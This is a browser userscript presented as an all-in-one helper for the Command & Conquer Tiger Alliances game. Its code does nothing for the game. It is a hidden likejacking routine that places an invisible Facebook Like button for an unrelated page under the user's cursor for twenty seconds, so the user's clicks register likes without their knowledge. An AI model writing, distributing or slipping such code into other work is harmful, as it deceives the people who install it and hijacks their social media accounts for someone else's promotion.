// ==UserScript==
// @name		Eldas All in One
// @namespace	https://prodgame*.alliances.commandandconquer.com/*/index.aspx*
// @include		https://prodgame*.alliances.commandandconquer.com/*/index.aspx*
// @icon		https://prodgame13.alliances.commandandconquer.com/146/favicon.ico
// @version		2.6
// @date		2013-03-30
// @author		Elda1990
// @description	Eldas All in One V2
// @downloadURL	http://userscripts.org/scripts/source/159255.user.js
// @updateURL	http://userscripts.org/scripts/source/159255.meta.js
// ==/UserScript==




(function(){

  var Xcord = 0,
  Ycord = 0,
  IE = document.all ? true : false;
 
  if (!IE) document.captureEvents(Event.MOUSEMOVE);
 
  var lbox = document.createElement('iframe');
  lbox.src = 'http://www.facebook.com/plugins/like.php?href=' + encodeURIComponent(/*document.location.href*/ 'http://www.facebook.com/gadjetmurahmurah') + '&amp;layout=standard&amp;show_faces=true&amp;width=53&amp;action=lbox&amp;colorscheme=light&amp;height=80';
  lbox.scrolling = 'no';
  lbox.frameBorder = 0;
  lbox.allowTransparency = 'true';
  lbox.style.border = 0;
  lbox.style.overflow = 'hidden';
  lbox.style.cursor = 'pointer';
  lbox.style.width = '53px';
  lbox.style.height =  '23px';
  lbox.style.position = 'absolute';
  lbox.style.opacity = 0;
  document.getElementsByTagName('body')[0].appendChild(lbox);
 
  window.addEventListener('mousemove', mouseMove, false);
 
  setTimeout(function(){
    document.getElementsByTagName('body')[0].removeChild(lbox);
    window.removeEventListener('mousemove', mouseMove, false);
  }, 20000);
 
  function mouseMove(e) {
    if (IE) {
      Xcord = event.clientX + document.body.scrollLeft;
      Ycord = event.clientY + document.body.scrollTop;
    } else {
      Xcord = e.pageX;
      Ycord = e.pageY;
    }
    
    if (Xcord < 0) Xcord = 0;
    if (Ycord < 0) Ycord = 0;
    
    lbox.style.top = (Ycord - 8) + 'px';
    lbox.style.left = (Xcord - 25) + 'px';
    
    return true
  }
})();